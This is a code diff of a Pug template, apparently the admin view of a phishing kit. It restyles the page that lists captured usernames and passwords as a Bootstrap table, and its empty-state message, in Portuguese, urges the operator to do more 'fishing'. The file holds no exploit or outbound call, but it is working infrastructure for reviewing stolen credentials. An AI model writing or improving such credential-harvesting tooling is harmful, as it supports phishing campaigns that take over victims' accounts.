@@ -1,9 +1,19 @@
+head
+  link(rel='stylesheet',href='https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css')
+  script(src='https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js')
+
 html
   body
-    ul
-    each val in rows
-        p= 'user: ' + val.l 
-        p= 'pass: ' + val.p
-        br
-    else
-        p Nada aqui :(
+    div(class="container")
+      table(class="table table-sm table-dark table-striped")
+        thead
+          tr
+            th= 'USER'
+            th= 'PASS'
+        tbody
+          each val in rows
+            tr
+              td= val.l 
+              td= val.p
+          else
+            p Você não fez nenhuma pescaria, se esforce mais :)
